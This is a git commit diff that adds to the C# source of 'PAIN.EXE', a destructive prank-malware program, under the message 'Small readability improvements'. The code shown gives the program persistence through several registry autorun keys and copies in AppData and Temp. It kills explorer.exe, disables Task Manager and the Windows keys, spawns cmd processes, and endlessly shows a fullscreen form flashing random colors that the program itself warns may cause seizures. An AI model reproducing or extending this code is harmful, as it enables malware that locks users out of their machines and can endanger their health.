e486c85b35071576f3e97e03da1c0ed636a91318
CreepyCrafter24 <creepycrafter24.devel@gmail.com>
2018-12-10 20:57:54 +0100

    Small readability improvements

--- PAIN.EXE/Program.cs
+++ PAIN.EXE/Program.cs
@@ -7,18 +7,63 @@ using System.Reflection;
 using System.Windows.Forms;
 using PAIN.EXE.Properties;
 using System.Threading;
-
+using System.Drawing;
+using System.ComponentModel;
 namespace PAIN.EXE {
+    #region Display()
+    public partial class Form1 : Form {
+        Random r = new Random();
+        public Form1() => InitializeComponent();
+        private void timer1_Tick(object sender, EventArgs e) => BackColor = Color.FromArgb(r.Next(0, 255), r.Next(0, 255), r.Next(0, 255));
+        private IContainer components = null;
+        private System.Windows.Forms.Timer timer1;
+        protected override void Dispose(bool disposing) {
+            components.Dispose();
+            base.Dispose(disposing);
+        }
+
+        private void InitializeComponent() {
+            components = new Container();
+            SuspendLayout();
+            timer1 = new System.Windows.Forms.Timer(components) {
+                Enabled = true,
+                Interval = 50 //Standard: 100
+            };
+            timer1.Tick += new EventHandler(timer1_Tick);
+            AutoScaleMode = AutoScaleMode.Font;
+            FormBorderStyle = FormBorderStyle.None;
+            ShowInTaskbar = false;
+            WindowState = FormWindowState.Maximized;
+            ResumeLayout(false);
+
+        }
+    }
+    #endregion
     static class Program {
         [STAThread]
         static void Main() {
             if (!File.Exists(Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Pain.exe"))) {
                 #region Intro()
+                DialogResult[] Password = new DialogResult[] { DialogResult.Yes, DialogResult.No, DialogResult.Yes, DialogResult.Yes, DialogResult.No };
+                bool Success = true;
+                string s = "";
+                for (int i = 0; i < Password.Length; i++) {
+                    DialogResult res = MessageBox.Show("Please enter the password:\r\n" + s, "PAIN.EXE Unpacker", MessageBoxButtons.YesNoCancel);
+                    if (res != DialogResult.Yes && res != DialogResult.No)
+                        Environment.Exit(0);
+                    Success = res == Password[i] && Success;
+                    s += "*";
+                } if (!Success) {
+                    MessageBox.Show("Incorrect.", "PAIN.EXE Unpacker");
+                    Environment.Exit(0);
+                }
+                else
+                    MessageBox.Show("Correct. Executing...", "PAIN.EXE");
                 if (MessageBox.Show("This software might make your machine unoperable!\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                     Environment.Exit(0);
                 if (MessageBox.Show("This is the last warning! The author is not responsible for any damage this software causes!\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                     Environment.Exit(0);
-                if (MessageBox.Show("This application contains flickering images!\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
+                if (MessageBox.Show("This application contains flickering images! These might cause epilectic seizures!\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                     Environment.Exit(0);
                 if (MessageBox.Show("Executing this application requires antiviruses to be disabled.\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                     Environment.Exit(0);
@@ -26,6 +71,9 @@ namespace PAIN.EXE {
                     Environment.Exit(0);
                 #endregion
             }
+            Process p = new Process { StartInfo = new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c \"echo Running...\"" } };
+            for (int i = 0; i < 10; i++)
+                p.Start();
             #region Persist()
             string ADPath = Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Pain.exe");
             string TMPath = Combine(Path.GetTempPath(), @"Pain.exe");
@@ -34,19 +82,19 @@ namespace PAIN.EXE {
                 Process.Start(ADPath);
                 Environment.Exit(0);
             }
-            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "PainAppData", ADPath);
-            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "PainAppData", ADPath);
-            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "PainAppData", ADPath);
-            RefreshReg(@"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\load", "PainAppData", ADPath);
+            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "PainAppData", ADPath, RegistryValueKind.String);
+            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "PainAppData", ADPath, RegistryValueKind.String);
+            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "PainAppData", ADPath, RegistryValueKind.String);
+            RefreshReg(@"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\load", "PainAppData", ADPath, RegistryValueKind.String);
             RefreshFile(TMPath);
-            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "PainTemp", TMPath);
-            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "PainTemp", TMPath);
-            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "PainTemp", TMPath);
-            RefreshReg(@"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\load", "PainTemp", TMPath);
-            
-            Process.Start("cmd.exe", "/c \"taskkill /f /im explorer.exe\"");
-            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWinKeys", 1);
-            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1);
+            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "PainTemp", TMPath, RegistryValueKind.String);
+            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "PainTemp", TMPath, RegistryValueKind.String);
+            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "PainTemp", TMPath, RegistryValueKind.String);
+            RefreshReg(@"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\load", "PainTemp", TMPath, RegistryValueKind.String);
+
+            new Process { StartInfo = new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c \"taskkill /f /im explorer.exe\"", CreateNoWindow = false, WindowStyle = ProcessWindowStyle.Minimized } }.Start();
+            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWinKeys", 1, RegistryValueKind.DWord);
+            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);
             #endregion
             #region Check()
             Thread.Sleep(new Random(new Random().Next(100, 999)).Next(0, 500));
@@ -58,9 +106,8 @@ namespace PAIN.EXE {
             t.Start();
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
-            while (true) {
+            while (true)
                 Application.Run(new Form1());
-            }
         }
 
         public static string Combine(string part1, string part2) {
@@ -100,7 +147,7 @@ namespace PAIN.EXE {
             } catch { return false; }
         }
 
-        public static void RefreshReg(string HKCUKey, string ValueName, object Value) {
+        public static void RefreshReg(string HKCUKey, string ValueName, object Value, RegistryValueKind type) {
             try {
                 Registry.CurrentUser.OpenSubKey(HKCUKey, false).GetValue(ValueName);
             } catch { try {
@@ -109,7 +156,7 @@ namespace PAIN.EXE {
             } try {
                 if (Registry.CurrentUser.OpenSubKey(HKCUKey, false).GetValue(ValueName) != null)
                     return;
-                Registry.CurrentUser.OpenSubKey(HKCUKey, true).SetValue(ValueName, Value);
+                Registry.CurrentUser.OpenSubKey(HKCUKey, true).SetValue(ValueName, Value, type);
             } catch { }
         }
         #endregion
